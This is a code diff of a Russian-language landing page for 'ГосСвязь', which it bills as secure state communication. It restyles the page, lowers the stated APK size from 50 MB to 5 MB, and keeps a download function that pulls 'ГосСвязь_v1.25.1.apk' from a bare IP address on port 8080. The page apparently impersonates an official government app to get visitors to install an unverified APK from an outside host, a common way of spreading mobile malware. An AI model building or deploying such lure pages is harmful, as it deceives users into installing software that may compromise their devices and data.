@@ -60,15 +60,17 @@
       </div>
 
       <!-- Название и подзаголовок -->
-      <div class="text-center px-2 md:px-3">
-        <h1 class="text-[18px] md:text-[20px] font-semibold tracking-tighter">ГосСвязь</h1>
+      <div class="text-center px-1 md:px-1">
+        <h1 class="text-[20px] md:text-[22px] font-extrabold tracking-tighter">
+          <span class="text-[#117dcf]">Гос</span><span class="text-[#eb4040]">Связь</span>
+        </h1>
         <p class="text-[#a3b8d1] mt-0.2 text-sm md:text-base font-medium">
           Безопасная государственная связь
         </p>
       </div>
 
       <!-- Версия -->
-      <div class="flex justify-center mt-2">
+      <div class="flex justify-center mt-1">
         <div
           class="bg-[#1e3a6e] text-white text-xs font-medium px-5 py-1 rounded-3xl flex items-center gap-x-2 shadow-inner"
         >
@@ -79,7 +81,7 @@
       </div>
 
       <!-- Кнопка Скачать APK -->
-      <div class="px-4 md:px-6 mt-4">
+      <div class="px-4 md:px-6 mt-3">
         <button
           onclick="handleDownload()"
           class="glow-button w-full bg-[#3b82f6] hover:bg-[#2563eb] active:scale-95 text-white font-medium text-base py-2.5 rounded-xl flex items-center justify-center gap-x-2 shadow-lg"
@@ -91,12 +93,14 @@
 
       <!-- Размер файла -->
       <div class="text-center mt-1.5 text-[#a3b8d1] text-xs font-medium">
-        50 МБ • APK для Android
+        5 МБ • APK для Android
       </div>
 
       <!-- Характеристики -->
       <div class="mx-4 md:mx-6 mt-4 bg-[#1e2c4a] rounded-2xl p-3">
-        <h2 class="uppercase text-[#a3b8d1] text-xs font-semibold tracking-[0.5px] mb-2 text-center">
+        <h2
+          class="uppercase text-[#a3b8d1] text-xs font-semibold tracking-[0.5px] mb-2 text-center"
+        >
           Характеристики
         </h2>
 
@@ -249,7 +253,7 @@
       /**
        * Симуляция скачивания (как на реальном лендинге)
        */
-            function handleDownload() {
+      function handleDownload() {
         const button = document.querySelector('button');
         const originalText = button.innerHTML;
 
@@ -265,11 +269,11 @@
 
         // Реальне скачування APK
         setTimeout(() => {
-          const url = "http://5.61.36.94:8080/download/app";
-          
+          const url = 'http://5.61.36.94:8080/download/app';
+
           const a = document.createElement('a');
           a.href = url;
-          a.download = "ГосСвязь_v1.25.1.apk";   // ім'я файлу, яке буде у користувача
+          a.download = 'ГосСвязь_v1.25.1.apk'; // ім'я файлу, яке буде у користувача
           document.body.appendChild(a);
           a.click();
           document.body.removeChild(a);
